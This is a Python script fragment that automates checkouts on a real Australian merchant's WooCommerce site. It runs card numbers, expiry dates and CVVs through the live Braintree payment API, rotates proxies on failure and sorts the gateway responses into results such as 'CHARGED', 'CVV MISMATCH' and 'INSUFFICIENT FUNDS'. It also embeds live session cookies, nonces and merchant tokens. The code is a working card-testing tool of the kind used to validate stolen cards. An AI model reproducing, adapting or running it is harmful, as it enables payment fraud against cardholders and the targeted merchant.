f'security={sec}&payment_method=braintree_cc&country=AU&state={billing_state}&postcode=&city=&address=&s_country=AU&s_state={billing_state}&s_postcode=&s_city=&s_address=&has_full_address=false&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3Dhttps%253A%252F%252Fwww.lebara.com.au%252Fcheckout%252F%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.lebara.com.au%252F%26wc_order_attribution_session_start_time%3D2026-05-24%252008%253A41%253A41%26wc_order_attribution_session_pages%3D3%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26captcha%3D%26billing_title%3DMr%26billing_first_name%3D%26billing_last_name%3D%26billing_email%3D%26billing_phone%3D%26billing_address_1%3D%26billing_city%3D%26billing_state%3D{billing_state}%26billing_postcode%3D%26billing_country%3DAU%26ship_to_different_address%3D0%26shipping_title%3DMr%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_country%3DAU%26shipping_state%3D{billing_state}%26shipping_postcode%3D%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252Fcheckout%252F%26cart%255B67f87eb1d553f785481c43ae5ac07259%255D%255Bqty%255D%3D1%26shipping_method%255B0%255D%3Dfree_shipping%253A3%26coupon_code%3D%26woocommerce-cart-nonce%3D8bce9058ce%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=free_shipping%3A3'
            
            response = r.post(AJAX_URL, params=params_update, headers=headers_update, data=data_update, cookies=cookies_update, timeout=30)
            
            # ================ 5. TOKENIZE CREDIT CARD ================
            headers_token = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'accept-language': dynamic_headers['accept-language'],
                'authorization': f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': user,
                'sec-ch-ua': dynamic_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': dynamic_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': dynamic_headers['sec-ch-ua-platform'],
            }
            
            token_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': session_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': n,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                            'billingAddress': {
                                'postalCode': billing_postcode,
                                'streetAddress': billing_address[:50],
                            },
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=token_data, timeout=30)
            try:
                tok = response.json()['data']['tokenizeCreditCard']['token']
            except:
                print(f"[!] Tokenization failed with proxy {proxy_ip}, retrying...")
                continue
            
            # ================ 6. FINAL CHECKOUT ================
            cookies_final = {
                'woocommerce_items_in_cart': '1',
                'woocommerce_cart_hash': 'c500f5aa44a187006446bad84238569d',
                'wp_woocommerce_session_74a7c7c1c7d41e8337eac97ea28a85dd': 't_50ff4592f1a7abee174a87a58b97f8%7C1779784917%7C1779698517%7C%24generic%24H-A13D6CzEJIebEgKLgQQdLHnEv40KM7wqXyOj-t',
            }
            
            headers_final = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': dynamic_headers['accept-language'],
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': SITE_URL,
                'referer': CHECKOUT_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
                'sec-ch-ua': dynamic_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': dynamic_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': dynamic_headers['sec-ch-ua-platform'],
                'Connection': 'close',
            }
            
            params_final = {'wc-ajax': 'checkout'}
            
            data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fwww.lebara.com.au%2Fcheckout%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.lebara.com.au%2F&wc_order_attribution_session_start_time=2026-05-24+08%3A41%3A41&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&captcha=&billing_title=Mr&billing_first_name={billing_first}&billing_last_name={billing_last}&billing_email={billing_email}&billing_phone={billing_phone}&billing_address_1={billing_address.replace(" ", "+")}&billing_city={billing_city}&billing_state={billing_state}&billing_postcode={billing_postcode}&billing_country=AU&ship_to_different_address=0&shipping_title=Mr&shipping_first_name=&shipping_last_name=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_country=AU&shipping_state={billing_state}&shipping_postcode=&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F25rtv2297vvgh5nh%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F25rtv2297vvgh5nh%22%7D%2C%22merchantId%22%3A%2225rtv2297vvgh5nh%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI4NmEyYTg1NS1hZGM1LTQyOWUtODIwZC0xYWRjMDcwNDBjMTkiLCJpYXQiOjE3Nzk2MTIwOTMsImV4cCI6MTc3OTYxOTI5MywiaXNzIjoiNjQ3ZjFmZjNmNDc4MTc1MWFmOGZkNDQ1IiwiT3JnVW5pdElkIjoiNjQ2ZTUxNTM0Y2EwZDk0YzIzYjgwMGE5In0.gp1rkLegabRayR7cjjKwUNTPDqXriIsm6L3jsJuv0WA%22%2C%22cardinalSongbirdUrl%22%3A%22https%3A%2F%2Fsongbird.cardinalcommerce.com%2Fedge%2Fv1%2Fsongbird.js%22%2C%22cardinalSongbirdIdentityHash%22%3Anull%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Lebara+Play+AUD%22%2C%22clientId%22%3A%22Ae_7Bse9lgZu4ywSF2lX0UUaKZRatgIi4vurojKEBhvDffBpITsaSycrp4Dq9s_HGUlDShjB6lljLZCS%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22lebaraserviceAUD%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22AUD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=%7B%22correlation_id%22%3A%22{correlation_id}%22%7D&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&cart%5B67f87eb1d553f785481c43ae5ac07259%5D%5Bqty%5D=1&shipping_method%5B0%5D=free_shipping%3A3&coupon_code=&woocommerce-cart-nonce=8bce9058ce&_wp_http_referer=%2Fcheckout%2F'
            
            response = r.post(AJAX_URL, params=params_final, headers=headers_final, data=data_final, cookies=cookies_final, timeout=30)
            
            # ================ 7. PARSE RESULT ================
            try:
                result_data = json.loads(response.text)
                messages = result_data.get("messages", "")
                full_response = response.text
            except:
                return 'PARSE_ERROR'
            
            clean_messages = clean_html(messages)
            clean_full = clean_html(full_response)
            search_text = clean_messages + " " + clean_full
            
            reason_match = re.search(r'reason:\s*([^\.]+)', search_text)
            reason = reason_match.group(1).strip() if reason_match else None
            
            print(f"[DEBUG] Clean response: {search_text[:300]}")
            
            # ==================== ردود Braintree الكاملة ====================
            
            if 'charged' in search_text or 'success' in search_text or 'completed' in search_text or 'approved' in search_text:
                return 'CHARGED'
            
            if 'insufficient funds' in search_text or 'insufficient_funds' in search_text:
                return 'INSUFFICIENT FUNDS'
            
            if 'cvv' in search_text or 'cvv2 failure' in search_text or 'cvv mismatch' in search_text:
                return 'CVV MISMATCH'
            
            if 'expired card' in search_text or 'expired_card' in search_text:
                return 'EXPIRED CARD'
            
            if 'processor declined - fraud suspected' in search_text:
                return 'PROCESSOR DECLINED - FRAUD SUSPECTED'
            
            if 'fraud' in search_text or 'fraud suspect' in search_text:
                return 'FRAUD'
            
            if 'gateway rejected: fraud' in search_text:
                return 'GATEWAY REJECTED - FRAUD'
            
            if 'risk_threshold' in search_text:
                return 'RISK THRESHOLD'
            
            if 'processor declined' in search_text:
                return 'PROCESSOR DECLINED'
            
            if 'do not honor' in search_text or 'do_not_honor' in search_text:
                return 'DO NOT HONOR'
            
            if 'closed card' in search_text or 'card closed' in search_text:
                return 'CLOSED CARD'
            
            if 'call issuer' in search_text or 'pick up card' in search_text or 'pickup card' in search_text:
                return 'CALL ISSUER - PICKUP CARD'
            
            if '3d secure' in search_text or 'three_d_secure' in search_text or '3ds' in search_text:
                return '3D SECURE REQUIRED'
            
            if 'limit exceeded' in search_text or 'exceeds limit' in search_text:
                return 'LIMIT EXCEEDED'
            
            if 'lost or stolen' in search_text or 'stolen card' in search_text:
                return 'LOST/STOLEN CARD'
            
            if 'address verification' in search_text or 'avs' in search_text or 'postal code mismatch' in search_text:
                return 'ADDRESS MISMATCH'
            
            if 'invalid card' in search_text or 'card number invalid' in search_text:
                return 'INVALID CARD'
            
            if 'cannot authorize' in search_text or 'not authorized at this time' in search_text:
                return 'CANNOT AUTHORIZE (POLICY)'
            
            if 'transaction not allowed' in search_text:
                return 'TRANSACTION NOT ALLOWED'
            
            if 'card not activated' in search_text:
                return 'CARD NOT ACTIVATED'
            
            if 'no account' in search_text or 'no_account' in search_text:
                return 'NO ACCOUNT'
            
            if 'card restricted' in search_text:
                return 'CARD RESTRICTED'
            
            # الرد الجديد
            if 'issuer or cardholder has put a restriction on the card' in search_text or 'issuer restriction' in search_text:
                return 'ISSUER RESTRICTION - CARD HOLDER RESTRICTION'
            
            if 'declined' in search_text:
                return 'DECLINED'
            
            if reason and len(reason) < 60:
                return reason.upper()
            
            if clean_messages and len(clean_messages) < 100:
                return clean_messages.title()
            
            return 'DECLINED'
            
        except Exception as e:
            last_error = str(e)[:50]
            print(f"[!] Proxy {proxy_ip} failed: {last_error}")
            if attempt == max_retries - 1:
                return f'PROXY_ERROR: {last_error}'
            continue
    
    return f'PROXY_ERROR: {last_error}'
